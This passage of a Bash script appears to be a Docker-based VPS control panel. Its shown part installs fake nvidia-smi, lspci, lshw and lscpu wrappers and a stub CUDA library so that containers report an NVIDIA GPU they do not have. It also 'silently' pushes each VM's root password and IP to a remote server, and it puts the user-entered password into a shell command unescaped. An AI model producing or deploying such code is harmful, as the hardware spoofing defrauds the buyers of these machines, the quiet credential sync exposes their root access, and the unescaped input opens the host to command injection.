echo "  Spec store bypass:      Mitigation; Speculative Store Bypass disabled via prctl"
echo "  Spectre v1:             Mitigation; load fences"
echo "  Spectre v2:             Mitigation; Retpolines, IBPB"
echo "  Srbds:                  Not affected"
echo "  Tsx async abort:        Not affected"
exit 0
LSCPU_EOF
            docker cp /tmp/_fake_lscpu "$VM_NAME":/usr/local/bin/lscpu
            docker exec "$VM_NAME" chmod +x /usr/local/bin/lscpu 2>/dev/null
            # Ensure /usr/local/bin is first in PATH (so our wrapper takes priority)
            docker exec "$VM_NAME" bash -c "grep -q 'usr/local/bin' /etc/profile 2>/dev/null || echo 'export PATH=/usr/local/bin:\$PATH' >> /etc/profile" 2>/dev/null
            rm -f /tmp/_fake_lscpu
            echo -e " ${GREEN}✔ CPU spoof deployed (lscpu + /proc/cpuinfo)${NC}"
        fi

        # 6. Apply GPU Spoofing (fake nvidia-smi + lspci + neofetch)
        if [ -n "$GPU_SPOOF_NAME" ]; then
            echo -e " ${BLUE}∞${NC} Setting up GPU spoof..."

            # Compute display values
            local pad_name=$(printf '%-23s' "$GPU_SPOOF_NAME")
            local pad_vram=$(printf '%-17s' "${GPU_SPOOF_VRAM}MiB")
            local gpu_vram_gb=$((GPU_SPOOF_VRAM / 1024))
            if [ $gpu_vram_gb -eq 0 ]; then gpu_vram_gb=1; fi

            docker exec "$VM_NAME" bash -c "mkdir -p /usr/local/bin /etc/nvidia"

            # --- Fake nvidia-smi ---
            cat > /tmp/_fake_smi << SMIEOF
#!/bin/bash
if [ "\$1" == "-L" ] 2>/dev/null; then
    echo "libcuda.so.1"
    exit 0
fi
echo ""
echo "+-----------------------------------------------------------------------------------------+"
echo "| NVIDIA-SMI 550.54.15              Driver Version: 550.54.15         CUDA Version: 12.4  |"
echo "+-----------------------------------------+------------------------+---------------------+"
echo "| GPU  Name                           | Persistence-M| Bus-Id        | Disp.A | Volatile Uncorr. ECC |"
echo "| Fan  Temp  Perf            Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M.  |"
echo "|=========================================+========================+=====================|"
echo "|   0  ${pad_name}| On  | 00000000:00:04.0 Off |                    0   |"
echo "| 30%   42C    P8               18W / 350W|     ${pad_vram}|      0%      Default   |"
echo "|                                         |                        |                     N/A |"
echo "+-----------------------------------------+------------------------+---------------------+"
SMIEOF
            docker cp /tmp/_fake_smi "$VM_NAME":/usr/bin/nvidia-smi
            docker exec "$VM_NAME" chmod +x /usr/bin/nvidia-smi
            rm -f /tmp/_fake_smi

            # --- Fake libcuda.so stub ---
            docker exec "$VM_NAME" bash -c "mkdir -p /usr/lib/x86_64-linux-gnu"
            docker exec "$VM_NAME" bash -c "echo '/* fake libcuda stub */' > /usr/lib/x86_64-linux-gnu/libcuda.so.1"
            docker exec "$VM_NAME" bash -c "ln -sf /usr/lib/x86_64-linux-gnu/libcuda.so.1 /usr/lib/x86_64-linux-gnu/libcuda.so 2>/dev/null"

            # --- Proper lspci wrapper (makes neofetch detect GPU) ---
            # Ensure pciutils is installed
            docker exec "$VM_NAME" bash -c "
                if ! command -v lspci >/dev/null 2>&1; then
                    apt-get update -qq && apt-get install -y -qq pciutils >/dev/null 2>&1
                    apk add pciutils >/dev/null 2>&1
                fi
            " 2>/dev/null

            # Backup real lspci
            docker exec "$VM_NAME" bash -c "
                if [ -f /usr/bin/lspci ] && [ ! -f /usr/bin/lspci.real ]; then
                    cp /usr/bin/lspci /usr/bin/lspci.real
                elif [ -f /usr/sbin/lspci ] && [ ! -f /usr/sbin/lspci.real ]; then
                    cp /usr/sbin/lspci /usr/sbin/lspci.real
                    ln -sf /usr/sbin/lspci.real /usr/bin/lspci.real 2>/dev/null
                fi
                # If no real lspci exists, create a dummy
                if [ ! -f /usr/bin/lspci.real ]; then
                    echo '#!/bin/bash' > /usr/bin/lspci.real
                    chmod +x /usr/bin/lspci.real
                fi
            "

            # Create the wrapper script on host, then copy
            cat > /tmp/_fake_lspci << 'LSPEOF'
#!/bin/bash
REAL=/usr/bin/lspci.real
if [ ! -x "$REAL" ]; then REAL=/usr/sbin/lspci.real; fi
GPU_NAME="__GPU_PLACEHOLDER__"
if echo "$@" | grep -q '\-mm'; then
    echo "\"01:00.0\" \"VGA compatible controller\" \"NVIDIA Corporation\" \"${GPU_NAME}\" \"\\""
    if [ -x "$REAL" ]; then $REAL "$@" 2>/dev/null | grep -v -i 'VGA\|3D\|Display'; fi
else
    echo "01:00.0 VGA compatible controller: NVIDIA Corporation ${GPU_NAME} (rev a1)"
    if [ -x "$REAL" ]; then $REAL "$@" 2>/dev/null | grep -v -i 'VGA\|3D\|Display'; fi
fi
LSPEOF
            sed -i "s|__GPU_PLACEHOLDER__|${GPU_SPOOF_NAME}|g" /tmp/_fake_lspci
            docker cp /tmp/_fake_lspci "$VM_NAME":/usr/bin/lspci
            docker exec "$VM_NAME" chmod +x /usr/bin/lspci
            rm -f /tmp/_fake_lspci

            # --- Fake lshw display output (fallback detection) ---
            docker exec "$VM_NAME" bash -c "
                if [ -f /usr/bin/lshw ] && [ ! -f /usr/bin/lshw.real ]; then
                    cp /usr/bin/lshw /usr/bin/lshw.real
                fi
                if [ -f /usr/sbin/lshw ] && [ ! -f /usr/sbin/lshw.real ]; then
                    cp /usr/sbin/lshw /usr/sbin/lshw.real
                fi
            " 2>/dev/null

            cat > /tmp/_fake_lshw << LSHWEOF
#!/bin/bash
REAL=/usr/bin/lshw.real
if [ ! -x "\$REAL" ]; then REAL=/usr/sbin/lshw.real; fi
if echo "\$@" | grep -q 'display\|C display'; then
    echo '*-display'
    echo '     description: VGA compatible controller'
    echo "     product: ${GPU_SPOOF_NAME}"
    echo '     vendor: NVIDIA Corporation'
    echo '     physical id: 0'
    echo '     bus info: pci@0000:01:00.0'
    echo '     version: a1'
    echo '     width: 64 bits'
    echo '     clock: 33MHz'
    echo '     capabilities: vga_controller bus_master cap_list rom'
    echo '     configuration: driver=nvidia latency=0'
    echo '     resources: irq:147 memory:fb000000-fbffffff memory:c0000000-cfffffff memory:d0000000-d1ffffff ioport:e000(size=128)'
else
    if [ -x "\$REAL" ]; then \$REAL "\$@"; fi
fi
LSHWEOF
            docker cp /tmp/_fake_lshw "$VM_NAME":/usr/bin/lshw
            docker exec "$VM_NAME" chmod +x /usr/bin/lshw 2>/dev/null
            rm -f /tmp/_fake_lshw

            # --- Skip /proc/driver/nvidia (read-only filesystem in containers) ---
            # Create a fake information file in /etc/nvidia for tools that check it
            docker exec "$VM_NAME" bash -c "echo 'Model: ${GPU_SPOOF_NAME}' > /etc/nvidia/gpu_info 2>/dev/null"
            docker exec "$VM_NAME" bash -c "echo 'IRQ:   147' >> /etc/nvidia/gpu_info 2>/dev/null"
            docker exec "$VM_NAME" bash -c "echo 'GPU UUID: GPU-$(head -c 16 /dev/urandom | od -A n -t x1 | tr -d ' ')' >> /etc/nvidia/gpu_info 2>/dev/null"
            docker exec "$VM_NAME" bash -c "echo 'Video BIOS: ${GPU_SPOOF_NAME}' >> /etc/nvidia/gpu_info 2>/dev/null"
            docker exec "$VM_NAME" bash -c "echo 'Bus Type: PCIe' >> /etc/nvidia/gpu_info 2>/dev/null"

            # --- Skip /sys/class/nvidia (Operation not permitted in unprivileged containers) ---
            # --- GPU neofetch override is handled in config.conf above ---

            echo -e " ${GREEN}✔ GPU spoofed: ${GPU_SPOOF_NAME} (${GPU_SPOOF_VRAM}MB)${NC}"
        fi

        # ==========================================
        # SAVE STATE & SYNC TO REMOTE (SILENT)
        # ==========================================
        local effective_ip=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$VM_NAME" 2>/dev/null)

        save_local_state "$VM_NAME" "$VM_ID_NAME" "$VM_PASS" "$effective_ip" "$VM_TYPE"

        if [ "$REMOTE_ENABLED" == true ]; then
            push_vm_to_remote "$VM_NAME" "$VM_ID_NAME" "$VM_PASS" "$effective_ip" "$VM_TYPE"
        fi

        echo -e ""
        echo -e "  ${GREEN}${BOLD}✔ VM BOOTED & CONFIGURED SUCCESSFULLY!${NC}"
        echo -e "  ${DIM}Redirecting to VM manager...${NC}"
        echo ""
        sleep 2
        manage_vm_menu "$VM_NAME"
    else
        log_msg "ERROR: Container creation failed. $DOCKER_ERR"
        echo -e " ${RED}✘ [SYSTEM FAULT] Creation failed.${NC}"
        echo -e " ${YELLOW}────────────────── DOCKER ERROR ──────────────────${NC}"
        echo -e " ${WHITE}$DOCKER_ERR${NC}"
        echo -e " ${YELLOW}──────────────────────────────────────────────────${NC}"

        if echo "$DOCKER_ERR" | grep -qi "overlay\|invalid argument"; then
             echo -e " ${CYAN}ℹ SUGGESTION: Your server doesn't support Docker's default overlayfs."
             echo -e " Return to the main menu and select ${GREEN}[F] Fix Docker (OverlayFS Error)${NC} to resolve this permanently.${NC}"
        fi

        echo -e " ${YELLOW}Full error details saved to log file: ${WHITE}$LOG_FILE${NC}"

        docker rm -f "$VM_NAME" >/dev/null 2>&1
        docker network rm "net_$VM_NAME" >/dev/null 2>&1
        sleep 5
    fi
}


# ==================================================
#       PREMIUM++ FUNCTIONS
# ==================================================

show_vm_info() {
    local vm_name=$1
    local display_name=${vm_name#tasin-vm-}
    clear
    echo -e "${CYAN}  ┌──────────────────────────────────────────────────┐${NC}"
    echo -e "  ${WHITE}━━  VM INFORMATION: ${CYAN}$display_name${NC}  ${PREMIUM}PREMIUM++${NC}"
    echo -e "${CYAN}  │                                                  │${NC}"

    local state=$(docker inspect -f '{{.State.Running}}' "$vm_name" 2>/dev/null)
    if [ "$state" == "true" ]; then
        STATE_DISPLAY="${GREEN}● RUNNING${NC}"
    else
        STATE_DISPLAY="${RED}● STOPPED${NC}"
    fi
    local created=$(docker inspect -f '{{.Created}}' "$vm_name" 2>/dev/null | cut -d'.' -f1)
    local image=$(docker inspect -f '{{.Config.Image}}' "$vm_name" 2>/dev/null)

    echo -e "${CYAN}  │${NC}  ${WHITE}Status:${NC}         $STATE_DISPLAY"
    echo -e "${CYAN}  │${NC}  ${WHITE}Container:${NC}      $vm_name"
    echo -e "${CYAN}  │${NC}  ${WHITE}Image:${NC}          $image"
    echo -e "${CYAN}  │${NC}  ${WHITE}Created:${NC}        $created"

    local vm_type="VPS"
    if [ -f "/root/.tasin/vms/${display_name}/vm_type.info" ]; then
        vm_type=$(cat "/root/.tasin/vms/${display_name}/vm_type.info")
    fi
    if [ "$vm_type" == "vds" ]; then
        echo -e "${CYAN}  │${NC}  ${WHITE}Type:${NC}           ${PURPLE}VDS (KVM)${NC}"
    else
        echo -e "${CYAN}  │${NC}  ${WHITE}Type:${NC}           ${GREEN}VPS${NC}"
    fi

    local mem_limit=$(docker inspect -f '{{.HostConfig.Memory}}' "$vm_name" 2>/dev/null)
    local cpu_limit=$(docker inspect -f '{{.HostConfig.NanoCpus}}' "$vm_name" 2>/dev/null)
    if [ "$mem_limit" != "0" ] && [ -n "$mem_limit" ]; then
        local mem_mb=$((mem_limit / 1048576))
        echo -e "${CYAN}  │${NC}  ${WHITE}RAM Limit:${NC}      ${mem_mb}MB"
    else
        echo -e "${CYAN}  │${NC}  ${WHITE}RAM Limit:${NC}      ${YELLOW}Unlimited${NC}"
    fi
    if [ "$cpu_limit" != "0" ] && [ -n "$cpu_limit" ]; then
        local cores=$((cpu_limit / 1000000000))
        echo -e "${CYAN}  │${NC}  ${WHITE}CPU Cores:${NC}     $cores"
    else
        echo -e "${CYAN}  │${NC}  ${WHITE}CPU Cores:${NC}     ${YELLOW}Unlimited${NC}"
    fi

    local ip=$(get_vm_ip "$vm_name")
    echo -e "${CYAN}  │${NC}  ${WHITE}IP Address:${NC}     ${CYAN}${ip:-N/A}${NC}"

    local speed_file="/root/.tasin/vms/${display_name}/speed.info"
    if [ -f "$speed_file" ]; then
        local spd=$(cat "$speed_file")
        if [ "$spd" -ge 1000 ]; then
            echo -e "${CYAN}  │${NC}  ${WHITE}Speed Limit:${NC}   $((spd/1000))Gbps"
        else
            echo -e "${CYAN}  │${NC}  ${WHITE}Speed Limit:${NC}   ${spd}Mbps"
        fi
    else
        echo -e "${CYAN}  │${NC}  ${WHITE}Speed Limit:${NC}   ${DIM}Default (unlimited)${NC}"
    fi

    local gpu_file="/root/.tasin/vms/${display_name}/gpu_name.info"
    if [ -f "$gpu_file" ]; then
        local gpu_name_val=$(cat "$gpu_file")
        local gpu_vram=""
        if [ -f "/root/.tasin/vms/${display_name}/gpu_vram.info" ]; then
            gpu_vram=$(cat "/root/.tasin/vms/${display_name}/gpu_vram.info")
            local vram_gb=$((gpu_vram / 1024))
            echo -e "${CYAN}  │${NC}  ${WHITE}GPU:${NC}            ${CYAN}${gpu_name_val}${NC} ${DIM}[${gpu_vram}MB / ${vram_gb}GB]${NC}"
        else
            echo -e "${CYAN}  │${NC}  ${WHITE}GPU:${NC}            ${CYAN}${gpu_name_val}${NC}"
        fi
    else
        echo -e "${CYAN}  │${NC}  ${WHITE}GPU:${NC}            ${DIM}None${NC}"
    fi

    if [ -f "/root/.tasin/vms/${display_name}/dmi_product.info" ]; then
        local model=$(cat "/root/.tasin/vms/${display_name}/dmi_product.info")
        echo -e "${CYAN}  │${NC}  ${WHITE}Model Name:${NC}    $model"
    fi

    local password=$(get_vm_password "$vm_name")
    echo -e "${CYAN}  │${NC}  ${WHITE}Root Password:${NC} ${RED}${password}${NC}"

    if [ "$state" == "true" ]; then
        echo -e "${CYAN}  │${NC}"
        echo -e "${CYAN}  │${NC}  ${DIM}─── Live Resource Usage ───${NC}"
        local stats=$(docker stats "$vm_name" --no-stream --format "{{.CPUPerc}}|{{.MemUsage}}|{{.NetIO}}|{{.BlockIO}}" 2>/dev/null)
        if [ -n "$stats" ]; then
            local cpu_pct=$(echo "$stats" | cut -d'|' -f1)
            local mem_usage=$(echo "$stats" | cut -d'|' -f2)
            local net_io=$(echo "$stats" | cut -d'|' -f3)
            local blk_io=$(echo "$stats" | cut -d'|' -f4)
            echo -e "${CYAN}  │${NC}  ${WHITE}CPU:${NC}           $cpu_pct"
            echo -e "${CYAN}  │${NC}  ${WHITE}Memory:${NC}        $mem_usage"
            echo -e "${CYAN}  │${NC}  ${WHITE}Network I/O:${NC}   $net_io"
            echo -e "${CYAN}  │${NC}  ${WHITE}Disk I/O:${NC}      $blk_io"
        fi
    fi

    echo -e "${CYAN}  └──────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -n " Press Enter to go back... "
    read -r
}

edit_vm_config() {
    local vm_name=$1
    local display_name=${vm_name#tasin-vm-}

    while true; do
        clear
        echo -e "${GOLD}  ┌──────────────────────────────────────────────────┐${NC}"
        echo -e "  ${WHITE}━━  EDIT CONFIGURATION: ${CYAN}$display_name${NC}  ${PREMIUM}PREMIUM++${NC}"
        echo -e "${GOLD}  └──────────────────────────────────────────────────┘${NC}"
        echo -e ""

        local cur_mem=$(docker inspect -f '{{.HostConfig.Memory}}' "$vm_name" 2>/dev/null)
        local cur_cpu=$(docker inspect -f '{{.HostConfig.NanoCpus}}' "$vm_name" 2>/dev/null)
        local cur_mem_display="Unlimited"
        local cur_cpu_display="Unlimited"
        [ "$cur_mem" != "0" ] && [ -n "$cur_mem" ] && cur_mem_display="$((cur_mem/1048576))MB"
        [ "$cur_cpu" != "0" ] && [ -n "$cur_cpu" ] && cur_cpu_display="$((cur_cpu/1000000000)) cores"

        echo -e "  ${DIM}Current Configuration:${NC}"
        echo -e "   RAM:    ${WHITE}${cur_mem_display}${NC}"
        echo -e "   CPU:    ${WHITE}${cur_cpu_display}${NC}"

        local speed_file="/root/.tasin/vms/${display_name}/speed.info"
        if [ -f "$speed_file" ]; then
            local spd=$(cat "$speed_file")
            if [ "$spd" -ge 1000 ]; then
                echo -e "   Speed:  ${WHITE}$((spd/1000))Gbps${NC}"
            else
                echo -e "   Speed:  ${WHITE}${spd}Mbps${NC}"
            fi
        else
            echo -e "   Speed:  ${DIM}Default (unlimited)${NC}"
        fi
        echo ""
        echo -e "  1) ${GREEN}Change Root Password${NC}"
        echo -e "  2) ${GREEN}Change RAM Limit${NC}"
        echo -e "  3) ${GREEN}Change CPU Cores${NC}"
        echo -e "  4) ${GREEN}Change Network Speed${NC}"
        echo -e "  0) ${RED}Back${NC}"
        draw_separator
        echo -n " Select Option: "
        read -r edit_opt

        case "$edit_opt" in
            1)
                echo -n " Enter new root password: "
                read -r new_pass
                if [ -n "$new_pass" ]; then
                    echo "root:$new_pass" | docker exec -i "$vm_name" bash -c "chpasswd" 2>/dev/null
                    # Update stored password for login screen validation
                    docker exec "$vm_name" bash -c "printf '%s\n' '$new_pass' > /etc/tasin-spoof/root_password" 2>/dev/null
                    local old_state=$(get_local_state "$vm_name")
                    local hname=$(echo "$old_state" | cut -d'|' -f1)
                    local old_ip=$(echo "$old_state" | cut -d'|' -f3)
                    local vtype=$(echo "$old_state" | cut -d'|' -f4)
                    save_local_state "$vm_name" "$hname" "$new_pass" "$old_ip" "$vtype"
                    if [ "$REMOTE_ENABLED" == true ]; then
                        push_vm_to_remote "$vm_name" "$hname" "$new_pass" "$old_ip" "$vtype"
                    fi
                    echo -e " ${GREEN}✔ Password changed!${NC}"
                fi
                sleep 1
                ;;
            2)
                echo -n " Enter new RAM (e.g. 2g, 4g, 8g): "
                read -r new_ram
                if [ -n "$new_ram" ]; then
                    docker update --memory="$new_ram" "$vm_name" >/dev/null 2>&1
                    echo -e " ${GREEN}✔ RAM updated to $new_ram${NC}"
                    log_msg "Edit: $vm_name RAM changed to $new_ram"
                fi
                sleep 1
                ;;
            3)
                echo -n " Enter new CPU cores (e.g. 1, 2, 4): "
                read -r new_cpu
                if [ -n "$new_cpu" ]; then
                    docker update --cpus="$new_cpu" "$vm_name" >/dev/null 2>&1
                    echo -e " ${GREEN}✔ CPU updated to $new_cpu cores${NC}"
                    log_msg "Edit: $vm_name CPU changed to $new_cpu"
                fi
                sleep 1
                ;;
            4)
                echo -n " Enter speed in Mbps (blank = unlimited): "
                read -r new_speed
                if [ -n "$new_speed" ] && [[ "$new_speed" =~ ^[0-9]+$ ]]; then
                    docker exec "$vm_name" bash -c "
                        if ! command -v tc >/dev/null 2>&1; then
                            apt-get update -qq && apt-get install -y -qq iproute2 >/dev/null 2>&1
                        fi
                        IFACE=\$(ip route 2>/dev/null | awk '/default/ {print \$5}' | head -1)
                        [ -z "\$IFACE" ] && IFACE=eth0
                        tc qdisc del dev \$IFACE root 2>/dev/null
                        tc qdisc add dev \$IFACE root handle 1: htb default 10
                        tc class add dev \$IFACE parent 1: classid 1:10 htb rate ${new_speed}mbit ceil ${new_speed}mbit burst 15k cburst 15k
                        tc qdisc add dev \$IFACE parent 1:10 handle 10: sfq perturb 10
                        echo '${new_speed}' > /root/.speed_limit_value
                    " 2>/dev/null
                    echo "$new_speed" > "/root/.tasin/vms/${display_name}/speed.info"
                    echo -e " ${GREEN}✔ Speed updated to ${new_speed}Mbps${NC}"
                    log_msg "Edit: $vm_name speed changed to ${new_speed}Mbps"
                else
                    docker exec "$vm_name" bash -c "IFACE=\$(ip route 2>/dev/null | awk '/default/ {print \$5}' | head -1); [ -z "\$IFACE" ] && IFACE=eth0; tc qdisc del dev \$IFACE root 2>/dev/null" 2>/dev/null
                    rm -f "/root/.tasin/vms/${display_name}/speed.info"
                    docker exec "$vm_name" bash -c "rm -f /root/.speed_limit_value" 2>/dev/null
                    echo -e " ${GREEN}✔ Speed limit removed (unlimited)${NC}"
                    log_msg "Edit: $vm_name speed limit removed"
                fi
                sleep 1
                ;;
            0) return ;;
            *) ;;
        esac
    done
}

live_vm_performance() {
    local vm_name=$1
    local display_name=${vm_name#tasin-vm-}

    if [ "$(docker inspect -f '{{.State.Running}}' "$vm_name" 2>/dev/null)" != "true" ]; then
        echo -e " ${RED}✘ VM is not running! Start it first.${NC}"
        sleep 2
        return
    fi

    while true; do
        clear
        echo -e "${LIME}  ┌──────────────────────────────────────────────────┐${NC}"
        echo -e "  ${WHITE}━━  LIVE PERFORMANCE: ${CYAN}$display_name${NC}  ${PREMIUM}PREMIUM++${NC}"
        echo -e "${LIME}  └──────────────────────────────────────────────────┘${NC}"
        echo -e ""

        local stats=$(docker stats "$vm_name" --no-stream --format "{{.CPUPerc}}|{{.MemUsage}}|{{.MemPerc}}|{{.NetIO}}|{{.BlockIO}}|{{.PIDs}}" 2>/dev/null)
        if [ -n "$stats" ]; then
            local cpu_pct=$(echo "$stats" | cut -d'|' -f1 | tr -d ' ')
            local mem_usage=$(echo "$stats" | cut -d'|' -f2)
            local mem_pct=$(echo "$stats" | cut -d'|' -f3 | tr -d ' ')
            local net_io=$(echo "$stats" | cut -d'|' -f4)
            local blk_io=$(echo "$stats" | cut -d'|' -f5)
            local pids=$(echo "$stats" | cut -d'|' -f6)

            local cpu_num=$(echo "$cpu_pct" | cut -d'%' -f1 | awk -F. '{print $1}')
            cpu_num=${cpu_num:-0}
            local cpu_bar=""
            local cpu_color="${GREEN}"
            if [ "$cpu_num" -gt 80 ] 2>/dev/null; then cpu_color="${RED}"
            elif [ "$cpu_num" -gt 50 ] 2>/dev/null; then cpu_color="${YELLOW}"; fi
            local filled=$((cpu_num / 5))
            local empty=$((20 - filled))
            local c; for ((c=0; c<filled; c++)); do cpu_bar+="█"; done
            for ((c=0; c<empty; c++)); do cpu_bar+="░"; done

            echo -e "  ${WHITE}  CPU Usage${NC}"
            echo -e "  ${cpu_color}${cpu_bar}${NC}  ${BOLD}${cpu_pct}${NC}"
            echo ""

            local mem_num=$(echo "$mem_pct" | cut -d'%' -f1 | awk -F. '{print $1}')
            mem_num=${mem_num:-0}
            local mem_bar=""
            local mem_color="${GREEN}"
            if [ "$mem_num" -gt 80 ] 2>/dev/null; then mem_color="${RED}"
            elif [ "$mem_num" -gt 50 ] 2>/dev/null; then mem_color="${YELLOW}"; fi
            filled=$((mem_num / 5))
            empty=$((20 - filled))
            mem_bar=""
            for ((c=0; c<filled; c++)); do mem_bar+="█"; done
            for ((c=0; c<empty; c++)); do mem_bar+="░"; done

            echo -e "  ${WHITE}  Memory${NC}"
            echo -e "  ${mem_color}${mem_bar}${NC}  ${BOLD}${mem_usage}${NC} (${mem_pct})"
            echo ""

            echo -e "  ${WHITE}  Network I/O:${NC}    ${CYAN}${net_io}${NC}"
            echo -e "  ${WHITE}  Disk I/O:${NC}       ${CYAN}${blk_io}${NC}"
            echo -e "  ${WHITE}  Processes:${NC}      ${CYAN}${pids}${NC}"
        else
            echo -e "  ${RED}Failed to get stats.${NC}"
        fi

        echo ""
        echo -e "  ${DIM}Auto-refreshing every 2s. Press Ctrl+C to stop.${NC}"
        sleep 2
    done
}

# ==================================================
#       MIGRATION (v3.1 → v3.2: move to hidden .tasin/ directory)
# ==================================================
migrate_to_hidden_dir() {
    # 1. Migrate old flat info files from /root/scripts-tasin/ to /root/.tasin/vms/<name>/
    if [ -d "/root/scripts-tasin" ]; then
        for f in /root/scripts-tasin/*_*.info; do
            [ -f "$f" ] || continue
            local base=$(basename "$f" .info)
            # Split <type>_<name> — type is everything before the LAST _
            local type="${base%_*}"
            local name="${base##*_}"
            # Handle names that contain underscores (e.g. vm_type_my_vm)
            # Re-derive: type is first word, name is rest
            type=$(echo "$base" | cut -d'_' -f1)
            name=$(echo "$base" | cut -d'_' -f2-)
            # Special: vm_type, dmi_product, dmi_vendor, gpu_name, gpu_vram are two-word types
            case "$base" in
                vm_type_*) type="vm_type"; name="${base#vm_type_}";;
                dmi_product_*) type="dmi_product"; name="${base#dmi_product_}";;
                dmi_vendor_*) type="dmi_vendor"; name="${base#dmi_vendor_}";;
                gpu_name_*) type="gpu_name"; name="${base#gpu_name_}";;
                gpu_vram_*) type="gpu_vram"; name="${base#gpu_vram_}";;
            esac
            [ -z "$name" ] && continue
            mkdir -p "$TASIN_VMS/$name"
            mv "$f" "$TASIN_VMS/$name/$type.info" 2>/dev/null
        done
        # Remove old now-empty directory
        rmdir "/root/scripts-tasin" 2>/dev/null
        log_msg "Migration: moved scripts-tasin info files to $TASIN_VMS/"
    fi

    # 2. Migrate old docker_data_* folders to /root/.tasin/data/<name>/
    for d in /root/docker_data_*; do
        [ -d "$d" ] || continue
        local name="${d#/root/docker_data_}"
        if [ "$name" == "test" ]; then
            # Remove leftover 'test' data directory if the corresponding container no longer exists
            if ! docker inspect "tasin-vm-test" >/dev/null 2>&1; then
                rm -rf "$d"
                log_msg "Migration: removed orphaned docker_data_test"
                continue
            fi
        fi
        mkdir -p "$TASIN_DATA"
        mv "$d" "$TASIN_DATA/$name" 2>/dev/null
        log_msg "Migration: moved $d to $TASIN_DATA/$name"
    done

    # 3. Migrate old state/license files (log stays at /root/vm_manager.log — visible)
    # If a previous version hid the log inside .tasin/, bring it back out to /root/
    [ -f "$TASIN_BASE/vm_manager.log" ] && [ ! -f "/root/vm_manager.log" ] && \
        mv "$TASIN_BASE/vm_manager.log" "/root/vm_manager.log" 2>/dev/null
    [ -f "/root/.vm_remote_state" ] && [ ! -f "$TASIN_BASE/state" ] && \
        mv "/root/.vm_remote_state" "$TASIN_BASE/state" 2>/dev/null
    [ -f "/root/.vm_license_cache" ] && [ ! -f "$TASIN_BASE/license_cache" ] && \
        mv "/root/.vm_license_cache" "$TASIN_BASE/license_cache" 2>/dev/null
}

# Run migration silently on startup
migrate_to_hidden_dir 2>/dev/null

# ==================================================
#       MAIN LOOP
# ==================================================

# Auto-clean fake /dev/kvm directories
if [ -d /dev/kvm ] && [ ! -c /dev/kvm ]; then
    rmdir /dev/kvm 2>/dev/null
fi

# --- SILENT INIT ---
if [ "$REMOTE_ENABLED" == true ]; then
    validate_license
    start_sync_daemon
fi

cleanup() {
    stop_sync_daemon
    log_msg "Panel exited."
    exit 0
}
trap cleanup EXIT INT TERM

while true; do
    clear
    mapfile -t VMS < <(docker ps -a --format '{{.Names}}' | grep "^tasin-vm-")

    # ─── Gather live host stats for the dashboard ───
    # CPU%: read /proc/stat twice (100ms apart) for an accurate delta
    _cpu1_sum=$(awk '/^cpu /{s=0; for(i=2;i<=NF;i++) s+=$i; print s}' /proc/stat 2>/dev/null)
    _cpu1_idle=$(awk '/^cpu /{print $5}' /proc/stat 2>/dev/null)
    sleep 0.1
    _cpu2_sum=$(awk '/^cpu /{s=0; for(i=2;i<=NF;i++) s+=$i; print s}' /proc/stat 2>/dev/null)
    _cpu2_idle=$(awk '/^cpu /{print $5}' /proc/stat 2>/dev/null)
    if [ -n "$_cpu1_sum" ] && [ -n "$_cpu2_sum" ] && [ "$_cpu2_sum" != "$_cpu1_sum" ]; then
        _host_cpu=$(awk "BEGIN {printf \"%.0f\", (1 - ($_cpu2_idle-$_cpu1_idle)/($_cpu2_sum-$_cpu1_sum)) * 100}")
    else
        _host_cpu=0
    fi
    [ -z "$_host_cpu" ] && _host_cpu=0

    # RAM: use free -m and convert to GB for readability
    _host_mem_total_mb=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}')
    _host_mem_used_mb=$(free -m 2>/dev/null | awk '/^Mem:/{print $3}')
    [ -z "$_host_mem_total_mb" ] && _host_mem_total_mb=0
    [ -z "$_host_mem_used_mb" ] && _host_mem_used_mb=0
    if [ "$_host_mem_total_mb" -ge 1024 ] 2>/dev/null; then
        _host_mem_total=$(awk "BEGIN{printf \"%.0f\", $_host_mem_total_mb/1024}")
        _host_mem_used=$(awk "BEGIN{printf \"%.0f\", $_host_mem_used_mb/1024}")
        _host_mem_disp="${_host_mem_used}GB/${_host_mem_total}GB"
    else
        _host_mem_disp="${_host_mem_used_mb}MB/${_host_mem_total_mb}MB"
    fi
    if [ "$_host_mem_total_mb" -gt 0 ] 2>/dev/null; then
        _host_mem_pct=$(awk "BEGIN{printf \"%.0f\", $_host_mem_used_mb/$_host_mem_total_mb*100}")
    else
        _host_mem_pct=0
    fi

    _host_up_sec=$(awk '{printf "%.0f", $1}' /proc/uptime 2>/dev/null)
    _host_up_d=$((_host_up_sec / 86400))
    _host_up_h=$(( (_host_up_sec % 86400) / 3600 ))
    _host_up_m=$(( (_host_up_sec % 3600) / 60 ))
    _host_up_str="${_host_up_d}d ${_host_up_h}h ${_host_up_m}m"
    _net_status="${GREEN}ONLINE${NC}"

    # ─── Premium header with host status bar ───
    echo -e "${GOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GOLD}║${NC}  ${BRIGHT_ORANGE}◆${NC} ${WHITE}TASIN VPS CONTROL PANEL${NC}  ${DIM}v3.8${NC}   ${PREMIUM}PREMIUM++${NC}  ${GOLD}║${NC}"
    echo -e "${GOLD}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GOLD}║${NC}  ${DIM}HOST STATUS${NC}  CPU: ${LIME}${_host_cpu}%${NC}  RAM: ${LIME}${_host_mem_disp}${NC}(${_host_mem_pct}%)  UP: ${CYAN}${_host_up_str}${NC}  ${_net_status}  ${GOLD}║${NC}"
    echo -e "${GOLD}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo -e ""

    if [ ${#VMS[@]} -eq 0 ]; then
        echo -e "  ${DIM}┌──────────────────────────────────────────────────┐${NC}"
        echo -e "  ${DIM}│${NC}  ${YELLOW}No VMs created yet.${NC}                              ${DIM}│${NC}"
        echo -e "  ${DIM}│${NC}  ${DIM}Press ${GREEN}[N]${NC}${DIM} to deploy your first virtual machine.${NC}      ${DIM}│${NC}"
        echo -e "  ${DIM}└──────────────────────────────────────────────────┘${NC}"
    else
        echo -e "  ${BLUE}┌──┬──────────────────────────┬──────┬───────────────┐${NC}"
        echo -e "  ${BLUE}│${NC}${BOLD} #${NC}  ${BOLD}VM NAME${NC}                   ${BOLD}TYPE${NC}   ${BOLD}STATUS${NC}        ${BLUE}│${NC}"
        echo -e "  ${BLUE}├──┼──────────────────────────┼──────┼───────────────┤${NC}"
        i=1
        for vm in "${VMS[@]}"; do
